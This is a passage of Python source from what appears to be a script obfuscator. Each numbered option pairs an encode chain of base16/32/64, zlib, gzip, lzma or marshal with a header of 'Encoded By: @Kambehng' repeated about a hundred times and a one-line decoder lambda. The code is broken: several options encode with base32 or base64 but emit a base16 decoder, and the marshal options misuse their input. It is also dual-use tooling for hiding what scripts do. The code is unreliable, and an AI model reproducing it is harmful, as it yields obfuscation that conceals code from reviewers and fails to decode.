# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));"
    elif option == 11:
        xx = "b16(gzi(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('gzip').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 12:
        xx = "b32(gzi(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('gzip').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 13:
        xx = "b64(gzi(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('gzip').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 14:
        xx = "b16(lzm(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('lzma').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 15:
        xx = "b32(lzm(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('lzma').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 16:
        xx = "b64(lzm(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('lzma').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 17:
        xx = "zlb(mar(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));"
    elif option == 18:
        xx = "gzi(mar(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__[::-1]));"
    elif option == 19:
        xx = "lzm(mar(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__[::-1]));"
    elif option == 20:
        xx = "b16(mar(data.encode('utf8')))[::-1]"
        heading = "# Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # Encoded By: @Kambehng\n # 